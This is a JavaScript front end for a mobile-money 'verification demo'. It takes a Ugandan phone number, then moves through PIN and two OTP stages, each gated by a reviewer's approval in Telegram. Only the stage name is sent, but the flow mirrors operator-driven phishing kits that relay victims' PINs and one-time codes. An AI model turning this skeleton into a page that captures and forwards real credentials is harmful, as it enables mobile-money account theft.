// ============================================
// MoMo Verification Demo
// ============================================

let currentRef = null;
let currentStage = null;

let pollTimer = null;
let countdownTimer = null;

let reviewInProgress = false;

// Route each approval to the correct next page.
const stageOrder = {
  pin_demo: {
    approvedPage: "otp1Page",
    approvedStep: 5
  },

  otp1_demo: {
    approvedPage: "otp2Page",
    approvedStep: 6
  },

  otp2_demo: {
    approvedPage: "successPage",
    approvedStep: 7
  }
};

// ============================================
// PAGE NAVIGATION
// ============================================

function show(pageId, step) {
  document.querySelectorAll(".page").forEach(page => {
    page.classList.remove("active");
  });

  const page = document.getElementById(pageId);

  if (page) {
    page.classList.add("active");
  }

  const stepNumber = document.getElementById("stepNumber");
  const progressBar = document.getElementById("progressBar");

  if (stepNumber) {
    stepNumber.textContent = `Step ${step} of 7`;
  }

  if (progressBar) {
    progressBar.style.width =
      `${Math.min(100, (step / 7) * 100)}%`;
  }
}

// ============================================
// TIMER MANAGEMENT
// ============================================

function stopTimers() {
  if (pollTimer !== null) {
    clearInterval(pollTimer);
    pollTimer = null;
  }

  if (countdownTimer !== null) {
    clearInterval(countdownTimer);
    countdownTimer = null;
  }
}

// ============================================
// CREATE A DEMO REVIEW
// ============================================

async function requestReview(stage) {
  if (reviewInProgress) {
    return;
  }

  reviewInProgress = true;

  currentStage = stage;
  currentRef = null;

  const status = document.getElementById("reviewStatus");

  if (status) {
    status.textContent = "Requesting demo review...";
  }

  try {
    const response = await fetch("/api/demo-status", {
      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      // Only the fictional stage is sent.
      // No number, PIN, or OTP is included.
      body: JSON.stringify({
        stage: stage
      })
    });

    const data = await response.json();

    if (
      !response.ok ||
      !data.success ||
      !data.reference
    ) {
      throw new Error(
        data.error || "Could not create demo review."
      );
    }

    currentRef = data.reference;

    if (status) {
      status.textContent =
        "Review sent. Waiting for Approve Demo or Decline Demo...";
    }

    watchReview(currentRef, stage);

  } catch (error) {
    console.error("Demo review error:", error);

    reviewInProgress = false;

    if (status) {
      status.textContent =
        "Unable to request review. Check the server and Telegram configuration.";
    }
  }
}

// ============================================
// CHECK TELEGRAM REVIEW STATUS
// ============================================

function watchReview(reference, stage) {
  if (pollTimer !== null) {
    clearInterval(pollTimer);
  }

  pollTimer = setInterval(async () => {
    // Ignore responses belonging to an older review.
    if (
      currentRef !== reference ||
      currentStage !== stage
    ) {
      return;
    }

    try {
      const response = await fetch(
        `/api/demo-status/${encodeURIComponent(reference)}`,
        {
          cache: "no-store"
        }
      );

      if (!response.ok) {
        return;
      }

      const data = await response.json();

      // APPROVED
      if (data.status === "approved") {
        stopTimers();

        reviewInProgress = false;

        const next = stageOrder[stage];

        currentRef = null;
        currentStage = null;

        if (!next) {
          console.error("Unknown approved stage:", stage);
          return;
        }

        show(next.approvedPage, next.approvedStep);

        return;
      }

      // DECLINED
      if (data.status === "declined") {
        stopTimers();

        reviewInProgress = false;

        currentRef = null;
        currentStage = null;

        show("declinePage", 7);

        return;
      }

    } catch (error) {
      console.error("Review status check failed:", error);
    }
  }, 1500);
}

// ============================================
// SHOW SPINNER AND REQUEST REVIEW
// ============================================

function startWait(stage) {
  if (reviewInProgress) {
    return;
  }

  stopTimers();

  show("loadingPage", 4);

  const secondsDisplay = document.getElementById("seconds");
  const status = document.getElementById("reviewStatus");

  if (status) {
    status.textContent =
      "Waiting for the demo reviewer in Telegram...";
  }

  let seconds = 5;

  if (secondsDisplay) {
    secondsDisplay.textContent = `${seconds}s`;
  }

  // Countdown does not approve the demo automatically.
  countdownTimer = setInterval(() => {
    seconds--;

    if (secondsDisplay) {
      secondsDisplay.textContent =
        `${Math.max(0, seconds)}s`;
    }

    if (seconds <= 0) {
      clearInterval(countdownTimer);
      countdownTimer = null;

      if (status) {
        status.textContent =
          "Waiting for your reviewer's decision in Telegram...";
      }
    }
  }, 1000);

  requestReview(stage);
}

// ============================================
// START DEMO
// ============================================

const startBtn = document.getElementById("startBtn");

if (startBtn) {
  startBtn.addEventListener("click", () => {
    show("numberPage", 2);
  });
}

// ============================================
// UGANDA NUMBER VALIDATION
// ============================================

const numberInput = document.getElementById("demoNumber");
const numberBtn = document.getElementById("numberBtn");

if (numberInput) {
  numberInput.addEventListener("input", () => {
    // Allow digits only, with a maximum of nine.
    numberInput.value = numberInput.value
      .replace(/\D/g, "")
      .slice(0, 9);

    numberInput.setCustomValidity("");
  });
}

if (numberBtn && numberInput) {
  numberBtn.addEventListener("click", () => {
    const number = numberInput.value.trim();

    if (!/^7[0-9]{8}$/.test(number)) {
      numberInput.setCustomValidity(
        "Enter exactly nine digits starting with 7."
      );

      numberInput.reportValidity();
      numberInput.focus();

      return;
    }

    numberInput.setCustomValidity("");

    show("pinPage", 3);
  });
}

// ============================================
// DUMMY PIN DEMO
// ============================================

const pinBtn = document.getElementById("pinBtn");

if (pinBtn) {
  pinBtn.addEventListener("click", () => {
    startWait("pin_demo");
  });
}

// ============================================
// OTP 1 DEMO
// ============================================

const otp1Btn = document.getElementById("otp1Btn");

if (otp1Btn) {
  otp1Btn.addEventListener("click", () => {
    startWait("otp1_demo");
  });
}

// ============================================
// OTP 2 DEMO
// ============================================

const otp2Btn = document.getElementById("otp2Btn");

if (otp2Btn) {
  otp2Btn.addEventListener("click", () => {
    startWait("otp2_demo");
  });
}

// ============================================
// RESTART DEMO
// ============================================

function resetDemo() {
  stopTimers();

  currentRef = null;
  currentStage = null;

  reviewInProgress = false;

  if (numberInput) {
    numberInput.value = "";
    numberInput.setCustomValidity("");
  }

  show("homePage", 1);
}

const restartSuccess = document.getElementById("restartSuccess");
const restartDecline = document.getElementById("restartDecline");

if (restartSuccess) {
  restartSuccess.addEventListener("click", resetDemo);
}

if (restartDecline) {
  restartDecline.addEventListener("click", resetDemo);
}
